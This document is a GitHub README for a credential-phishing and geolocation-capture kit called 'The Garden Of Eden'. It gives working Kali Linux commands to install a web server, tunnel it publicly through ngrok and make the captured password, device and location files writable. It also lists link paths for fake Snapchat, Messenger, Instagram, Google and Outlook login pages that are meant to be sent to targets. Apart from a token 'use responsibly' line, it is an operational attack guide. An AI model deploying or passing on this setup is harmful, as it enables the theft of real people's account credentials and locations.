# The-Garden-Of-Eden
*UPDATES COMING!!! :)*
#
*TO DO:*
#
- ADD OTHER SECTIONS ASIDE FROM GEOLOCATOR
#
**PLEASE USE RESPONSIBLY! MORE TO COME.**
#
# Main Page:
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Eden.png)
# After A Successful Capture:
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Eden_2.png)
# Phishing Pages:
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Snapchat.png)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Messenger.png)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Instagram.png)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Google.png)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/Outlook.png)
#
## (KALI LINUX) INSTALL AND SETUP:
#
**1.) Install Dependencies:** 
`apt-get update &&
apt-get install apache2 php*`
#
**2.) Download The Repository:**
`cd /var/www/html &&
git clone https://github.com/Joel-Horensma/The-Garden-Of-Eden.git`
#
**3.) Setup An NGROK Account, Here: https://ngrok.com/download**
#
**4.) Install unzip And wget:**
`sudo apt-get install unzip wget`
#
**5.) Download NGROK:**
#
**For 32 bit:**
`cd /var/www/html/The-Garden-Of-Eden/NGROK && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip &&
unzip /var/www/html/The-Garden-Of-Eden/NGROK/ngrok-stable-linux-386.zip`
#
**For 64 bit:**
`cd /var/www/html/The-Garden-Of-Eden/NGROK && wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip &&
unzip /var/www/html/The-Garden-Of-Eden/NGROK/ngrok-stable-linux-amd64.zip`
#
**6.) Setup NGROK Auth Token**
`cd /var/www/html/The-Garden-Of-Eden/NGROK && ./ngrok authtoken <YOUR_AUTH_TOKEN_FROM_THE_ACCOUNT_YOU_SET_UP>`
#
**7.) Give Read And Write Permissions For The TXT Files
In The Folder "/php/txt":**
`cd /var/www/html/The-Garden-Of-Eden/php/txt &&
chmod a+rwx ApproxLoc.txt && chmod 777 ApproxLoc.txt && chmod a+rwx device.txt && chmod 777 device.txt && chmod a+rwx pass.txt && chmod 777 pass.txt`
#
## USAGE:
#
**1.) Launch NGROK:**
`cd /var/www/html/The-Garden-Of-Eden/NGROK &&
./ngrok http 80`
#
**2.) Open The Link In Your Browser:**
#
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/ngrok.png)
#
**3.) Click On The "The-Garden-Of-Eden" Directory, Then, Click "Dashboard.html"**
#
**4.) Now You'll Have The Garden Of Eden Main Page Open, In Your Browser. Change The Part Of The URL That Says “var/www/html To 127.0.0.1**
#
**5.) Send A Link Replacing "YOUR_NGROK_LINK" With Your Unique Link (e.g. Highlighted In The Image Above)**
#
# SNAPCHAT:
`YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Snapchat_Phisher/snapchat.html`
# Real One (Top) Server Link (Bottom)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/SnapchatLink.png)
#
# MESSENGER:
`YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Snapchat_Phisher/messenger`
# Real One (Top) Server Link (Bottom)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/MessengerLink.png)
#
# INSTAGRAM:
`YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Instagram_Phisher/instagram.html`
# Real One (Bottom) Server Link (Top)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/InstagramLink.png)
#
# GOOGLE:
`YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Google_Phisher/google.html`
# Real One (Bottom) Server Link (Top)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/GoogleLink.png)
#
# OUTLOOK:
`YOUR_NGROK_LINK/The-Garden-Of-Eden/Social/Outlook_Phisher/outlook.html` 
# Real One (Bottom) Server Link (Top)
![](https://github.com/Joel-Horensma/The-Garden-Of-Eden/blob/master/Images/OutlookLink.png)
#
